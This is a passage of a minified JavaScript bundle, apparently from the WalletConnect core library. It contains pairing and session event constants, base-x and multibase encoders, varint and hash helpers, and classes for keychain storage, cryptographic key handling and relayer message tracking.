    created: "history_created",
    updated: "history_updated",
    deleted: "history_deleted",
    sync: "history_sync"
}
  , Bt = "history"
  , Vt = "0.3"
  , qt = "expirer"
  , M = {
    created: "expirer_created",
    deleted: "expirer_deleted",
    expired: "expirer_expired",
    sync: "expirer_sync"
}
  , Gt = "0.3"
  , Wt = "verify-api"
  , Qs = "https://verify.walletconnect.com"
  , Ht = "https://verify.walletconnect.org"
  , ue = Ht
  , Yt = `${ue}/v3`
  , Jt = [Qs, Ht]
  , Xt = "echo"
  , Zt = "https://echo.walletconnect.com"
  , G = {
    pairing_started: "pairing_started",
    pairing_uri_validation_success: "pairing_uri_validation_success",
    pairing_uri_not_expired: "pairing_uri_not_expired",
    store_new_pairing: "store_new_pairing",
    subscribing_pairing_topic: "subscribing_pairing_topic",
    subscribe_pairing_topic_success: "subscribe_pairing_topic_success",
    existing_pairing: "existing_pairing",
    pairing_not_expired: "pairing_not_expired",
    emit_inactive_pairing: "emit_inactive_pairing",
    emit_session_proposal: "emit_session_proposal",
    subscribing_to_pairing_topic: "subscribing_to_pairing_topic"
}
  , Y = {
    no_wss_connection: "no_wss_connection",
    no_internet_connection: "no_internet_connection",
    malformed_pairing_uri: "malformed_pairing_uri",
    active_pairing_already_exists: "active_pairing_already_exists",
    subscribe_pairing_topic_failure: "subscribe_pairing_topic_failure",
    pairing_expired: "pairing_expired",
    proposal_expired: "proposal_expired",
    proposal_listener_not_found: "proposal_listener_not_found"
}
  , tr = {
    session_approve_started: "session_approve_started",
    proposal_not_expired: "proposal_not_expired",
    session_namespaces_validation_success: "session_namespaces_validation_success",
    create_session_topic: "create_session_topic",
    subscribing_session_topic: "subscribing_session_topic",
    subscribe_session_topic_success: "subscribe_session_topic_success",
    publishing_session_approve: "publishing_session_approve",
    session_approve_publish_success: "session_approve_publish_success",
    store_session: "store_session",
    publishing_session_settle: "publishing_session_settle",
    session_settle_publish_success: "session_settle_publish_success"
}
  , ir = {
    no_internet_connection: "no_internet_connection",
    no_wss_connection: "no_wss_connection",
    proposal_expired: "proposal_expired",
    subscribe_session_topic_failure: "subscribe_session_topic_failure",
    session_approve_publish_failure: "session_approve_publish_failure",
    session_settle_publish_failure: "session_settle_publish_failure",
    session_approve_namespace_validation_failure: "session_approve_namespace_validation_failure",
    proposal_not_found: "proposal_not_found"
}
  , sr = {
    authenticated_session_approve_started: "authenticated_session_approve_started",
    authenticated_session_not_expired: "authenticated_session_not_expired",
    chains_caip2_compliant: "chains_caip2_compliant",
    chains_evm_compliant: "chains_evm_compliant",
    create_authenticated_session_topic: "create_authenticated_session_topic",
    cacaos_verified: "cacaos_verified",
    store_authenticated_session: "store_authenticated_session",
    subscribing_authenticated_session_topic: "subscribing_authenticated_session_topic",
    subscribe_authenticated_session_topic_success: "subscribe_authenticated_session_topic_success",
    publishing_authenticated_session_approve: "publishing_authenticated_session_approve",
    authenticated_session_approve_publish_success: "authenticated_session_approve_publish_success"
}
  , rr = {
    no_internet_connection: "no_internet_connection",
    no_wss_connection: "no_wss_connection",
    missing_session_authenticate_request: "missing_session_authenticate_request",
    session_authenticate_request_expired: "session_authenticate_request_expired",
    chains_caip2_compliant_failure: "chains_caip2_compliant_failure",
    chains_evm_compliant_failure: "chains_evm_compliant_failure",
    invalid_cacao: "invalid_cacao",
    subscribe_authenticated_session_topic_failure: "subscribe_authenticated_session_topic_failure",
    authenticated_session_approve_publish_failure: "authenticated_session_approve_publish_failure",
    authenticated_session_pending_request_not_found: "authenticated_session_pending_request_not_found"
}
  , Qt = .1
  , ei = "event-client"
  , ti = 86400
  , ii = "https://pulse.walletconnect.org/batch";
function nr(q, U) {
    if (q.length >= 255)
        throw new TypeError("Alphabet too long");
    for (var Z = new Uint8Array(256), oe = 0; oe < Z.length; oe++)
        Z[oe] = 255;
    for (var et = 0; et < q.length; et++) {
        var st = q.charAt(et)
          , ws = st.charCodeAt(0);
        if (Z[ws] !== 255)
            throw new TypeError(st + " is ambiguous");
        Z[ws] = et
    }
    var ms = q.length
      , Es = q.charAt(0)
      , vs = Math.log(ms) / Math.log(256)
      , _s = Math.log(256) / Math.log(ms);
    function Is(Rs) {
        if (Rs instanceof Uint8Array || (ArrayBuffer.isView(Rs) ? Rs = new Uint8Array(Rs.buffer,Rs.byteOffset,Rs.byteLength) : Array.isArray(Rs) && (Rs = Uint8Array.from(Rs))),
        !(Rs instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
        if (Rs.length === 0)
            return "";
        for (var Ns = 0, Hs = 0, ha = 0, pa = Rs.length; ha !== pa && Rs[ha] === 0; )
            ha++,
            Ns++;
        for (var Zs = (pa - ha) * _s + 1 >>> 0, Qa = new Uint8Array(Zs); ha !== pa; ) {
            for (var Ga = Rs[ha], nl = 0, sl = Zs - 1; (Ga !== 0 || nl < Hs) && sl !== -1; sl--,
            nl++)
                Ga += 256 * Qa[sl] >>> 0,
                Qa[sl] = Ga % ms >>> 0,
                Ga = Ga / ms >>> 0;
            if (Ga !== 0)
                throw new Error("Non-zero carry");
            Hs = nl,
            ha++
        }
        for (var el = Zs - Hs; el !== Zs && Qa[el] === 0; )
            el++;
        for (var Bs = Es.repeat(Ns); el < Zs; ++el)
            Bs += q.charAt(Qa[el]);
        return Bs
    }
    function Ss(Rs) {
        if (typeof Rs != "string")
            throw new TypeError("Expected String");
        if (Rs.length === 0)
            return new Uint8Array;
        var Ns = 0;
        if (Rs[Ns] !== " ") {
            for (var Hs = 0, ha = 0; Rs[Ns] === Es; )
                Hs++,
                Ns++;
            for (var pa = (Rs.length - Ns) * vs + 1 >>> 0, Zs = new Uint8Array(pa); Rs[Ns]; ) {
                var Qa = Z[Rs.charCodeAt(Ns)];
                if (Qa === 255)
                    return;
                for (var Ga = 0, nl = pa - 1; (Qa !== 0 || Ga < ha) && nl !== -1; nl--,
                Ga++)
                    Qa += ms * Zs[nl] >>> 0,
                    Zs[nl] = Qa % 256 >>> 0,
                    Qa = Qa / 256 >>> 0;
                if (Qa !== 0)
                    throw new Error("Non-zero carry");
                ha = Ga,
                Ns++
            }
            if (Rs[Ns] !== " ") {
                for (var sl = pa - ha; sl !== pa && Zs[sl] === 0; )
                    sl++;
                for (var el = new Uint8Array(Hs + (pa - sl)), Bs = Hs; sl !== pa; )
                    el[Bs++] = Zs[sl++];
                return el
            }
        }
    }
    function Ts(Rs) {
        var Ns = Ss(Rs);
        if (Ns)
            return Ns;
        throw new Error(`Non-${U} character`)
    }
    return {
        encode: Is,
        decodeUnsafe: Ss,
        decode: Ts
    }
}
var or = nr
  , ar = or;
const si = q => {
    if (q instanceof Uint8Array && q.constructor.name === "Uint8Array")
        return q;
    if (q instanceof ArrayBuffer)
        return new Uint8Array(q);
    if (ArrayBuffer.isView(q))
        return new Uint8Array(q.buffer,q.byteOffset,q.byteLength);
    throw new Error("Unknown type, must be binary type")
}
  , cr = q => new TextEncoder().encode(q)
  , hr = q => new TextDecoder().decode(q);
class lr {
    constructor(U, Z, oe) {
        this.name = U,
        this.prefix = Z,
        this.baseEncode = oe
    }
    encode(U) {
        if (U instanceof Uint8Array)
            return `${this.prefix}${this.baseEncode(U)}`;
        throw Error("Unknown type, must be binary type")
    }
}
class ur {
    constructor(U, Z, oe) {
        if (this.name = U,
        this.prefix = Z,
        Z.codePointAt(0) === void 0)
            throw new Error("Invalid prefix character");
        this.prefixCodePoint = Z.codePointAt(0),
        this.baseDecode = oe
    }
    decode(U) {
        if (typeof U == "string") {
            if (U.codePointAt(0) !== this.prefixCodePoint)
                throw Error(`Unable to decode multibase string ${JSON.stringify(U)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);
            return this.baseDecode(U.slice(this.prefix.length))
        } else
            throw Error("Can only multibase decode strings")
    }
    or(U) {
        return ri(this, U)
    }
}
class dr {
    constructor(U) {
        this.decoders = U
    }
    or(U) {
        return ri(this, U)
    }
    decode(U) {
        const Z = U[0]
          , oe = this.decoders[Z];
        if (oe)
            return oe.decode(U);
        throw RangeError(`Unable to decode multibase string ${JSON.stringify(U)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)
    }
}
const ri = (q, U) => new dr({
    ...q.decoders || {
        [q.prefix]: q
    },
    ...U.decoders || {
        [U.prefix]: U
    }
});
class gr {
    constructor(U, Z, oe, et) {
        this.name = U,
        this.prefix = Z,
        this.baseEncode = oe,
        this.baseDecode = et,
        this.encoder = new lr(U,Z,oe),
        this.decoder = new ur(U,Z,et)
    }
    encode(U) {
        return this.encoder.encode(U)
    }
    decode(U) {
        return this.decoder.decode(U)
    }
}
const Ee$1 = ({name: q, prefix: U, encode: Z, decode: oe}) => new gr(q,U,Z,oe)
  , de = ({prefix: q, name: U, alphabet: Z}) => {
    const {encode: oe, decode: et} = ar(Z, U);
    return Ee$1({
        prefix: q,
        name: U,
        encode: oe,
        decode: st => si(et(st))
    })
}
  , pr = (q, U, Z, oe) => {
    const et = {};
    for (let _s = 0; _s < U.length; ++_s)
        et[U[_s]] = _s;
    let st = q.length;
    for (; q[st - 1] === "="; )
        --st;
    const ws = new Uint8Array(st * Z / 8 | 0);
    let ms = 0
      , Es = 0
      , vs = 0;
    for (let _s = 0; _s < st; ++_s) {
        const Is = et[q[_s]];
        if (Is === void 0)
            throw new SyntaxError(`Non-${oe} character`);
        Es = Es << Z | Is,
        ms += Z,
        ms >= 8 && (ms -= 8,
        ws[vs++] = 255 & Es >> ms)
    }
    if (ms >= Z || 255 & Es << 8 - ms)
        throw new SyntaxError("Unexpected end of data");
    return ws
}
  , yr = (q, U, Z) => {
    const oe = U[U.length - 1] === "="
      , et = (1 << Z) - 1;
    let st = ""
      , ws = 0
      , ms = 0;
    for (let Es = 0; Es < q.length; ++Es)
        for (ms = ms << 8 | q[Es],
        ws += 8; ws > Z; )
            ws -= Z,
            st += U[et & ms >> ws];
    if (ws && (st += U[et & ms << Z - ws]),
    oe)
        for (; st.length * Z & 7; )
            st += "=";
    return st
}
  , P = ({name: q, prefix: U, bitsPerChar: Z, alphabet: oe}) => Ee$1({
    prefix: U,
    name: q,
    encode(et) {
        return yr(et, oe, Z)
    },
    decode(et) {
        return pr(et, oe, Z, q)
    }
})
  , br = Ee$1({
    prefix: "\0",
    name: "identity",
    encode: q => hr(q),
    decode: q => cr(q)
});
var mr = Object.freeze({
    __proto__: null,
    identity: br
});
const fr = P({
    prefix: "0",
    name: "base2",
    alphabet: "01",
    bitsPerChar: 1
});
var Dr = Object.freeze({
    __proto__: null,
    base2: fr
});
const vr = P({
    prefix: "7",
    name: "base8",
    alphabet: "01234567",
    bitsPerChar: 3
});
var wr = Object.freeze({
    __proto__: null,
    base8: vr
});
const _r = de({
    prefix: "9",
    name: "base10",
    alphabet: "0123456789"
});
var Er = Object.freeze({
    __proto__: null,
    base10: _r
});
const Ir = P({
    prefix: "f",
    name: "base16",
    alphabet: "0123456789abcdef",
    bitsPerChar: 4
})
  , Tr = P({
    prefix: "F",
    name: "base16upper",
    alphabet: "0123456789ABCDEF",
    bitsPerChar: 4
});
var Cr = Object.freeze({
    __proto__: null,
    base16: Ir,
    base16upper: Tr
});
const Pr = P({
    prefix: "b",
    name: "base32",
    alphabet: "abcdefghijklmnopqrstuvwxyz234567",
    bitsPerChar: 5
})
  , Sr = P({
    prefix: "B",
    name: "base32upper",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",
    bitsPerChar: 5
})
  , Or = P({
    prefix: "c",
    name: "base32pad",
    alphabet: "abcdefghijklmnopqrstuvwxyz234567=",
    bitsPerChar: 5
})
  , Rr = P({
    prefix: "C",
    name: "base32padupper",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",
    bitsPerChar: 5
})
  , Ar = P({
    prefix: "v",
    name: "base32hex",
    alphabet: "0123456789abcdefghijklmnopqrstuv",
    bitsPerChar: 5
})
  , xr = P({
    prefix: "V",
    name: "base32hexupper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV",
    bitsPerChar: 5
})
  , Nr = P({
    prefix: "t",
    name: "base32hexpad",
    alphabet: "0123456789abcdefghijklmnopqrstuv=",
    bitsPerChar: 5
})
  , $r = P({
    prefix: "T",
    name: "base32hexpadupper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV=",
    bitsPerChar: 5
})
  , zr = P({
    prefix: "h",
    name: "base32z",
    alphabet: "ybndrfg8ejkmcpqxot1uwisza345h769",
    bitsPerChar: 5
});
var Lr = Object.freeze({
    __proto__: null,
    base32: Pr,
    base32upper: Sr,
    base32pad: Or,
    base32padupper: Rr,
    base32hex: Ar,
    base32hexupper: xr,
    base32hexpad: Nr,
    base32hexpadupper: $r,
    base32z: zr
});
const kr = de({
    prefix: "k",
    name: "base36",
    alphabet: "0123456789abcdefghijklmnopqrstuvwxyz"
})
  , jr = de({
    prefix: "K",
    name: "base36upper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
});
var Ur = Object.freeze({
    __proto__: null,
    base36: kr,
    base36upper: jr
});
const Fr = de({
    name: "base58btc",
    prefix: "z",
    alphabet: "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
})
  , Mr = de({
    name: "base58flickr",
    prefix: "Z",
    alphabet: "123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"
});
var Kr = Object.freeze({
    __proto__: null,
    base58btc: Fr,
    base58flickr: Mr
});
const Br = P({
    prefix: "m",
    name: "base64",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
    bitsPerChar: 6
})
  , Vr = P({
    prefix: "M",
    name: "base64pad",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
    bitsPerChar: 6
})
  , qr = P({
    prefix: "u",
    name: "base64url",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",
    bitsPerChar: 6
})
  , Gr = P({
    prefix: "U",
    name: "base64urlpad",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",
    bitsPerChar: 6
});
var Wr = Object.freeze({
    __proto__: null,
    base64: Br,
    base64pad: Vr,
    base64url: qr,
    base64urlpad: Gr
});
const ni = Array.from("🚀🪐☄🛰🌌🌑🌒🌓🌔🌕🌖🌗🌘🌍🌏🌎🐉☀💻🖥💾💿😂❤😍🤣😊🙏💕😭😘👍😅👏😁🔥🥰💔💖💙😢🤔😆🙄💪😉☺👌🤗💜😔😎😇🌹🤦🎉💞✌✨🤷😱😌🌸🙌😋💗💚😏💛🙂💓🤩😄😀🖤😃💯🙈👇🎶😒🤭❣😜💋👀😪😑💥🙋😞😩😡🤪👊🥳😥🤤👉💃😳✋😚😝😴🌟😬🙃🍀🌷😻😓⭐✅🥺🌈😈🤘💦✔😣🏃💐☹🎊💘😠☝😕🌺🎂🌻😐🖕💝🙊😹🗣💫💀👑🎵🤞😛🔴😤🌼😫⚽🤙☕🏆🤫👈😮🙆🍻🍃🐶💁😲🌿🧡🎁⚡🌞🎈❌✊👋😰🤨😶🤝🚶💰🍓💢🤟🙁🚨💨🤬✈🎀🍺🤓😙💟🌱😖👶🥴▶➡❓💎💸⬇😨🌚🦋😷🕺⚠🙅😟😵👎🤲🤠🤧📌🔵💅🧐🐾🍒😗🤑🌊🤯🐷☎💧😯💆👆🎤🙇🍑❄🌴💣🐸💌📍🥀🤢👅💡💩👐📸👻🤐🤮🎼🥵🚩🍎🍊👼💍📣🥂")
  , Hr = ni.reduce( (q, U, Z) => (q[Z] = U,
q), [])
  , Yr = ni.reduce( (q, U, Z) => (q[U.codePointAt(0)] = Z,
q), []);
function Jr(q) {
    return q.reduce( (U, Z) => (U += Hr[Z],
    U), "")
}
function Xr(q) {
    const U = [];
    for (const Z of q) {
        const oe = Yr[Z.codePointAt(0)];
        if (oe === void 0)
            throw new Error(`Non-base256emoji character: ${Z}`);
        U.push(oe)
    }
    return new Uint8Array(U)
}
const Zr = Ee$1({
    prefix: "🚀",
    name: "base256emoji",
    encode: Jr,
    decode: Xr
});
var Qr = Object.freeze({
    __proto__: null,
    base256emoji: Zr
})
  , en = ai
  , oi = 128
  , tn = 127
  , sn = ~tn
  , rn = Math.pow(2, 31);
function ai(q, U, Z) {
    U = U || [],
    Z = Z || 0;
    for (var oe = Z; q >= rn; )
        U[Z++] = q & 255 | oi,
        q /= 128;
    for (; q & sn; )
        U[Z++] = q & 255 | oi,
        q >>>= 7;
    return U[Z] = q | 0,
    ai.bytes = Z - oe + 1,
    U
}
var nn = Me$1
  , on = 128
  , ci = 127;
function Me$1(q, oe) {
    var Z = 0, oe = oe || 0, et = 0, st = oe, ws, ms = q.length;
    do {
        if (st >= ms)
            throw Me$1.bytes = 0,
            new RangeError("Could not decode varint");
        ws = q[st++],
        Z += et < 28 ? (ws & ci) << et : (ws & ci) * Math.pow(2, et),
        et += 7
    } while (ws >= on);
    return Me$1.bytes = st - oe,
    Z
}
var an = Math.pow(2, 7)
  , cn = Math.pow(2, 14)
  , hn = Math.pow(2, 21)
  , ln = Math.pow(2, 28)
  , un = Math.pow(2, 35)
  , dn = Math.pow(2, 42)
  , gn = Math.pow(2, 49)
  , pn = Math.pow(2, 56)
  , yn = Math.pow(2, 63)
  , bn = function(q) {
    return q < an ? 1 : q < cn ? 2 : q < hn ? 3 : q < ln ? 4 : q < un ? 5 : q < dn ? 6 : q < gn ? 7 : q < pn ? 8 : q < yn ? 9 : 10
}
  , mn = {
    encode: en,
    decode: nn,
    encodingLength: bn
}
  , hi = mn;
const li = (q, U, Z=0) => (hi.encode(q, U, Z),
U)
  , ui = q => hi.encodingLength(q)
  , Ke$1 = (q, U) => {
    const Z = U.byteLength
      , oe = ui(q)
      , et = oe + ui(Z)
      , st = new Uint8Array(et + Z);
    return li(q, st, 0),
    li(Z, st, oe),
    st.set(U, et),
    new fn(q,Z,U,st)
}
;
class fn {
    constructor(U, Z, oe, et) {
        this.code = U,
        this.size = Z,
        this.digest = oe,
        this.bytes = et
    }
}
const di = ({name: q, code: U, encode: Z}) => new Dn(q,U,Z);
class Dn {
    constructor(U, Z, oe) {
        this.name = U,
        this.code = Z,
        this.encode = oe
    }
    digest(U) {
        if (U instanceof Uint8Array) {
            const Z = this.encode(U);
            return Z instanceof Uint8Array ? Ke$1(this.code, Z) : Z.then(oe => Ke$1(this.code, oe))
        } else
            throw Error("Unknown type, must be binary type")
    }
}
const gi = q => async U => new Uint8Array(await crypto.subtle.digest(q, U))
  , vn = di({
    name: "sha2-256",
    code: 18,
    encode: gi("SHA-256")
})
  , wn = di({
    name: "sha2-512",
    code: 19,
    encode: gi("SHA-512")
});
var _n = Object.freeze({
    __proto__: null,
    sha256: vn,
    sha512: wn
});
const pi = 0
  , En = "identity"
  , yi = si
  , In = q => Ke$1(pi, yi(q))
  , Tn = {
    code: pi,
    name: En,
    encode: yi,
    digest: In
};
var Cn = Object.freeze({
    __proto__: null,
    identity: Tn
});
new TextEncoder,
new TextDecoder;
const bi = {
    ...mr,
    ...Dr,
    ...wr,
    ...Er,
    ...Cr,
    ...Lr,
    ...Ur,
    ...Kr,
    ...Wr,
    ...Qr
};
({
    ..._n,
    ...Cn
});
function mi(q) {
    return globalThis.Buffer != null ? new Uint8Array(q.buffer,q.byteOffset,q.byteLength) : q
}
function Pn(q=0) {
    return globalThis.Buffer != null && globalThis.Buffer.allocUnsafe != null ? mi(globalThis.Buffer.allocUnsafe(q)) : new Uint8Array(q)
}
function fi(q, U, Z, oe) {
    return {
        name: q,
        prefix: U,
        encoder: {
            name: q,
            prefix: U,
            encode: Z
        },
        decoder: {
            decode: oe
        }
    }
}
const Di = fi("utf8", "u", q => "u" + new TextDecoder("utf8").decode(q), q => new TextEncoder().encode(q.substring(1)))
  , Be = fi("ascii", "a", q => {
    let U = "a";
    for (let Z = 0; Z < q.length; Z++)
        U += String.fromCharCode(q[Z]);
    return U
}
, q => {
    q = q.substring(1);
    const U = Pn(q.length);
    for (let Z = 0; Z < q.length; Z++)
        U[Z] = q.charCodeAt(Z);
    return U
}
)
  , Sn = {
    utf8: Di,
    "utf-8": Di,
    hex: bi.base16,
    latin1: Be,
    ascii: Be,
    binary: Be,
    ...bi
};
function On(q, U="utf8") {
    const Z = Sn[U];
    if (!Z)
        throw new Error(`Unsupported encoding "${U}"`);
    return (U === "utf8" || U === "utf-8") && globalThis.Buffer != null && globalThis.Buffer.from != null ? mi(globalThis.Buffer.from(q, "utf-8")) : Z.decoder.decode(`${Z.prefix}${q}`)
}
var Rn = Object.defineProperty
  , An = (q, U, Z) => U in q ? Rn(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , W = (q, U, Z) => An(q, typeof U != "symbol" ? U + "" : U, Z);
class vi {
    constructor(U, Z) {
        this.core = U,
        this.logger = Z,
        W(this, "keychain", new Map),
        W(this, "name", Pt),
        W(this, "version", St$1),
        W(this, "initialized", !1),
        W(this, "storagePrefix", B),
        W(this, "init", async () => {
            if (!this.initialized) {
                const oe = await this.getKeyChain();
                typeof oe < "u" && (this.keychain = oe),
                this.initialized = !0
            }
        }
        ),
        W(this, "has", oe => (this.isInitialized(),
        this.keychain.has(oe))),
        W(this, "set", async (oe, et) => {
            this.isInitialized(),
            this.keychain.set(oe, et),
            await this.persist()
        }
        ),
        W(this, "get", oe => {
            this.isInitialized();
            const et = this.keychain.get(oe);
            if (typeof et > "u") {
                const {message: st} = Et$2("NO_MATCHING_KEY", `${this.name}: ${oe}`);
                throw new Error(st)
            }
            return et
        }
        ),
        W(this, "del", async oe => {
            this.isInitialized(),
            this.keychain.delete(oe),
            await this.persist()
        }
        ),
        this.core = U,
        this.logger = E$1(Z, this.name)
    }
    get context() {
        return y$2(this.logger)
    }
    get storageKey() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
    }
    async setKeyChain(U) {
        await this.core.storage.setItem(this.storageKey, Ys(U))
    }
    async getKeyChain() {
        const U = await this.core.storage.getItem(this.storageKey);
        return typeof U < "u" ? Xs(U) : void 0
    }
    async persist() {
        await this.setKeyChain(this.keychain)
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: U} = Et$2("NOT_INITIALIZED", this.name);
            throw new Error(U)
        }
    }
}
var xn = Object.defineProperty
  , Nn = (q, U, Z) => U in q ? xn(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , S = (q, U, Z) => Nn(q, typeof U != "symbol" ? U + "" : U, Z);
class wi {
    constructor(U, Z, oe) {
        this.core = U,
        this.logger = Z,
        S(this, "name", Tt),
        S(this, "keychain"),
        S(this, "randomSessionIdentifier", qc()),
        S(this, "initialized", !1),
        S(this, "init", async () => {
            this.initialized || (await this.keychain.init(),
            this.initialized = !0)
        }
        ),
        S(this, "hasKeys", et => (this.isInitialized(),
        this.keychain.has(et))),
        S(this, "getClientId", async () => {
            this.isInitialized();
            const et = await this.getClientSeed()
              , st = Po$2(et);
            return Qe$2(st.publicKey)
        }
        ),
        S(this, "generateKeyPair", () => {
            this.isInitialized();
            const et = Vc();
            return this.setPrivateKey(et.publicKey, et.privateKey)
        }
        ),
        S(this, "signJWT", async et => {
            this.isInitialized();
            const st = await this.getClientSeed()
              , ws = Po$2(st)
              , ms = this.randomSessionIdentifier;
            return await Qo$1(ms, et, Ct, ws)
        }
        ),
        S(this, "generateSharedKey", (et, st, ws) => {
            this.isInitialized();
            const ms = this.getPrivateKey(et)
              , Es = Kc(ms, st);
            return this.setSymKey(Es, ws)
        }
        ),
        S(this, "setSymKey", async (et, st) => {
            this.isInitialized();
            const ws = st || Fc(et);
            return await this.keychain.set(ws, et),
            ws
        }
        ),
        S(this, "deleteKeyPair", async et => {
            this.isInitialized(),
            await this.keychain.del(et)
        }
        ),
        S(this, "deleteSymKey", async et => {
            this.isInitialized(),
            await this.keychain.del(et)
        }
        ),
        S(this, "encode", async (et, st, ws) => {
            this.isInitialized();
            const ms = Ho$1(ws)
              , Es = safeJsonStringify(st);
            if (Qc(ms))
                return Wc(Es, ws == null ? void 0 : ws.encoding);
            if (Jc(ms)) {
                const Ss = ms.senderPublicKey
                  , Ts = ms.receiverPublicKey;
                et = await this.generateSharedKey(Ss, Ts)
            }
            const vs = this.getSymKey(et)
              , {type: _s, senderPublicKey: Is} = ms;
            return Gc({
                type: _s,
                symKey: vs,
                message: Es,
                senderPublicKey: Is,
                encoding: ws == null ? void 0 : ws.encoding
            })
        }
        ),
        S(this, "decode", async (et, st, ws) => {
            this.isInitialized();
            const ms = Xc(st, ws);
            if (Qc(ms)) {
                const Es = Yc(st, ws == null ? void 0 : ws.encoding);
                return safeJsonParse(Es)
            }
            if (Jc(ms)) {
                const Es = ms.receiverPublicKey
                  , vs = ms.senderPublicKey;
                et = await this.generateSharedKey(Es, vs)
            }
            try {
                const Es = this.getSymKey(et)
                  , vs = Zc({
                    symKey: Es,
                    encoded: st,
                    encoding: ws == null ? void 0 : ws.encoding
                });
                return safeJsonParse(vs)
            } catch (Es) {
                this.logger.error(`Failed to decode message from topic: '${et}', clientId: '${await this.getClientId()}'`),
                this.logger.error(Es)
            }
        }
        ),
        S(this, "getPayloadType", (et, st=Qt$1) => {
            const ws = Me$2({
                encoded: et,
                encoding: st
            });
            return Vt$1(ws.type)
        }
        ),
        S(this, "getPayloadSenderPublicKey", (et, st=Qt$1) => {
            const ws = Me$2({
                encoded: et,
                encoding: st
            });
            return ws.senderPublicKey ? toString(ws.senderPublicKey, tt) : void 0
        }
        ),
        this.core = U,
        this.logger = E$1(Z, this.name),
        this.keychain = oe || new vi(this.core,this.logger)
    }
    get context() {
        return y$2(this.logger)
    }
    async setPrivateKey(U, Z) {
        return await this.keychain.set(U, Z),
        U
    }
    getPrivateKey(U) {
        return this.keychain.get(U)
    }
    async getClientSeed() {
        let U = "";
        try {
            U = this.keychain.get(ke$1)
        } catch {
            U = qc(),
            await this.keychain.set(ke$1, U)
        }
        return On(U, "base16")
    }
    getSymKey(U) {
        return this.keychain.get(U)
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: U} = Et$2("NOT_INITIALIZED", this.name);
            throw new Error(U)
        }
    }
}
var $n = Object.defineProperty
  , zn = Object.defineProperties
  , Ln = Object.getOwnPropertyDescriptors
  , _i = Object.getOwnPropertySymbols
  , kn = Object.prototype.hasOwnProperty
  , jn = Object.prototype.propertyIsEnumerable
  , Ve = (q, U, Z) => U in q ? $n(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , Un = (q, U) => {
    for (var Z in U || (U = {}))
        kn.call(U, Z) && Ve(q, Z, U[Z]);
    if (_i)
        for (var Z of _i(U))
            jn.call(U, Z) && Ve(q, Z, U[Z]);
    return q
}
  , Fn = (q, U) => zn(q, Ln(U))
  , k = (q, U, Z) => Ve(q, typeof U != "symbol" ? U + "" : U, Z);
class Ei extends y$1 {
    constructor(U, Z) {
        super(U, Z),
        this.logger = U,
        this.core = Z,
        k(this, "messages", new Map),
        k(this, "messagesWithoutClientAck", new Map),
        k(this, "name", Ot),
        k(this, "version", Rt$1),
        k(this, "initialized", !1),
        k(this, "storagePrefix", B),
        k(this, "init", async () => {
            if (!this.initialized) {
                this.logger.trace("Initialized");
                try {
                    const oe = await this.getRelayerMessages();
                    typeof oe < "u" && (this.messages = oe);
                    const et = await this.getRelayerMessagesWithoutClientAck();
                    typeof et < "u" && (this.messagesWithoutClientAck = et),
                    this.logger.debug(`Successfully Restored records for ${this.name}`),
                    this.logger.trace({
                        type: "method",
                        method: "restore",
                        size: this.messages.size
                    })
                } catch (oe) {
                    this.logger.debug(`Failed to Restore records for ${this.name}`),
                    this.logger.error(oe)
                } finally {
                    this.initialized = !0
                }
            }
        }
        ),
        k(this, "set", async (oe, et, st) => {
            this.isInitialized();
            const ws = zc(et);
            let ms = this.messages.get(oe);
            if (typeof ms > "u" && (ms = {}),
            typeof ms[ws] < "u")
                return ws;
            if (ms[ws] = et,
            this.messages.set(oe, ms),
            st === le.inbound) {
                const Es = this.messagesWithoutClientAck.get(oe) || {};
                this.messagesWithoutClientAck.set(oe, Fn(Un({}, Es), {
                    [ws]: et
                }))
            }
            return await this.persist(),
            ws
        }
        ),
        k(this, "get", oe => {
            this.isInitialized();
            let et = this.messages.get(oe);
            return typeof et > "u" && (et = {}),
            et
        }
        ),
        k(this, "getWithoutAck", oe => {
            this.isInitialized();
            const et = {};
            for (const st of oe) {
                const ws = this.messagesWithoutClientAck.get(st) || {};
                et[st] = Object.values(ws)
            }
            return et
        }
        ),
        k(this, "has", (oe, et) => {
            this.isInitialized();
            const st = this.get(oe)
              , ws = zc(et);
            return typeof st[ws] < "u"
        }
        ),
        k(this, "ack", async (oe, et) => {
            this.isInitialized();
            const st = this.messagesWithoutClientAck.get(oe);
            if (typeof st > "u")
                return;
            const ws = zc(et);
            delete st[ws],
            Object.keys(st).length === 0 ? this.messagesWithoutClientAck.delete(oe) : this.messagesWithoutClientAck.set(oe, st),
            await this.persist()
        }
        ),
        k(this, "del", async oe => {
            this.isInitialized(),
            this.messages.delete(oe),
            this.messagesWithoutClientAck.delete(oe),
            await this.persist()
        }
        ),
        this.logger = E$1(U, this.name),
        this.core = Z
    }
    get context() {
        return y$2(this.logger)
    }
    get storageKey() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
    }
    get storageKeyWithoutClientAck() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name + "_withoutClientAck"
    }
    async setRelayerMessages(U) {
